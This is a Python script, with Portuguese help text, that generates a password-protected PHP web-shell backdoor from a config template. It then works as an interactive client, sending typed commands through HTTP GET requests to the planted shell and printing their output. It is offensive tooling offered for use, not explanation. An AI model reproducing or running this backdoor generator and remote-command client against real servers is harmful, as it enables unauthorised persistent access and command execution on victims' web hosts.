from argparse import ArgumentParser
from configparser import ConfigParser
from requests import get
from time import sleep
from sys import stdout


parser = ArgumentParser()
parser.add_argument("-u", dest="shell_url", action="store",
                    help="Url de sua shell!")
parser.add_argument("-g", dest="generate", action="store",
                    help="Cria seu payload")
parser.add_argument(dest="passwd", action="store",
                    help="Senha do seu backdoor")
args = parser.parse_args()

for i in range(50):
    print("/-\|"[i % 4], end="\b")
    stdout.flush()
    sleep(0.1)

if args.generate:
    if args.passwd:
        passwd = str(args.passwd)
    else:
        passwd = 'heavly'

    shell_name = str(args.generate)
    shell = shell_name+'.php'
    opfile = open(shell, '+w')
    config = ConfigParser()
    config.read_file(open('config.ini'))

    opfile.write(config['DEFAULT']['code'].replace('{passw}', passwd))
    opfile.close()
    print('Generated file '+ shell + 'with password' + passwd)


if args.shell_url:
    pwd = get(args.shell_url + '?passwd=' +
             args.passwd + '&c=pwd').text.replace("\n", "")
    pwd += "$ "
    while True:
        command = input(pwd)
        result = get(args.shell_url + '?passwd=' +
                    args.passwd + '&c=' + command).text
        print(result)
